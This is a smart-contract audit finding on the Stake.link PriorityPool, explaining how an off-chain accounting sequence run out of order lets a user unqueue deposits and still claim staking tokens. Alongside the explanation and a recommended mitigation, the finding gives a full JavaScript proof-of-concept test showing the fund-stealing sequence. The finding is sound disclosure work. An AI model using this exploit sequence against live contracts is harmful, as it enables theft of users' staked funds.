---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2023-08-25-cyfrin-stake-link-0-0
ingested_at: '2026-08-23T05:04:32Z'
protocol_category: []
published_at: '2023-08-25T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-08-25-cyfrin-stake-link.md
tags:
- firm:cyfrin
- report:2023-08-25-cyfrin-stake-link
title: The off-chain mechanism must be ensured to work in a correct order strictly
vuln_class: []
---

# The off-chain mechanism must be ensured to work in a correct order strictly

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2023-08-25-cyfrin-stake-link.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-08-25-cyfrin-stake-link.md)_

---

**Severity:** Medium

**Description:** The `PriorityPool` contract relies on the distribution oracle for accounting and the accounting calculation is done off-chain.

According to the communication with the protocol team, the correct workflow for queued deposits can be described as below:
- Whenever there is a new room for deposit in the staking pool, the function `depositQueuedTokens` is called.
- The `PriorityPool` contract is paused by calling `pauseForUpdate()`.
- Accounting calculations happen off-chain using the function `getAccountData()` and `getDepositsSinceLastUpdate()`(`depositsSinceLastUpdate`) variable to compose the latest Merkle tree.
- The distribution oracle calls the function `updateDistribution()` and this will resume the `PriorityPool`.

The only purpose of pausing the queue contract is to prevent unqueue until the accounting status are updated.
Through an analysis we found that the off-chain mechanism MUST follow the order very strictly or else user funds can be stolen.
While we acknowledge that the protocol team will ensure it, we decided to keep this finding as a medium risk because we can not verify the off-chain mechanism.

**Impact:** If the off-chain mechanism occurs in a wrong order by any chance, user funds can be stolen.
Given the likelihood is low, we evaluate the impact to be Medium.

**Proof of Concept:** The below test case shows the attack scenario.
```javascript
  it('Cyfrin: off-chain mechanism in an incorrect order can lead to user funds being stolen', async () => {
    // try deposit 1500 while the capacity is 1000
    await strategy.setMaxDeposits(toEther(1000))
    await sq.connect(signers[1]).deposit(toEther(1500), true)

    // 500 ether is queued for accounts[1]
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 500)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)

    // unqueue 500 ether should work while no updateDistribution was called
    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))
    assert.equal(fromEther(await sq.getQueuedTokens(accounts[1], 0)), 0)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)

    // deposit again
    await sq.connect(signers[1]).deposit(toEther(500), true)
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 8500)

    // victim deposits 500 ether and it will be queued
    await sq.connect(signers[2]).deposit(toEther(500), true)
    assert.equal(fromEther(await sq.totalQueued()), 1000)

    // max deposit has increased to 1500
    await strategy.setMaxDeposits(toEther(1500))

    // user sees that his queued tokens 500 can be deposited and call depositQueuedTokens
    // this will deposit the 500 ether in the queue
    await sq.connect(signers[1]).depositQueuedTokens()

    // Correct off-chain mechanism: pauseForUpdate -> getAccountData -> updateDistribution
    // Let us see what happens if getAccountData is called before pauseForUpdate

    // await sq.pauseForUpdate()

    // check account data
    var a_data = await sq.getAccountData()
    assert.equal(ethers.utils.formatEther(a_data[2][1]), "500.0")
    assert.equal(ethers.utils.formatEther(a_data[2][2]), "500.0")

    // user calls unqueueTokens to get his 500 ether back
    // this is possible because the queue contract is not paused
    await sq.connect(signers[1]).unqueueTokens(0, 0, [], toEther(500))

    // pauseForUpdate is called at a wrong order
    await sq.pauseForUpdate()

    // at this point user has 1000 ether staked and 9000 ether in his wallet
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1000)

    // now updateDistribution is called with the wrong data
    let data = [
      [ethers.constants.AddressZero, toEther(0), toEther(0)],
      [accounts[1], toEther(500), toEther(500)],
    ]
    let tree = StandardMerkleTree.of(data, ['address', 'uint256', 'uint256'])

    await sq.updateDistribution(
      tree.root,
      ethers.utils.formatBytes32String('ipfs'),
      toEther(500),
      toEther(500)
    )

    // at this point user claims his LSD tokens
    await sq.connect(signers[1]).claimLSDTokens(toEther(500), toEther(500), tree.getProof(1))

    // at this point user has 1500 ether staked and 9000 ether in his wallet
    assert.equal(fromEther(await token.balanceOf(accounts[1])), 9000)
    assert.equal(fromEther(await stakingPool.balanceOf(accounts[1])), 1500)
  })
```
**Recommended Mitigation:** Consider to force pause the contract at the end of the function `_depositQueuedTokens`.

**Client:**
Acknowledged. The protocol team will ensure the correct order of the off-chain mechanism.

**Cyfrin:** Acknowledged.
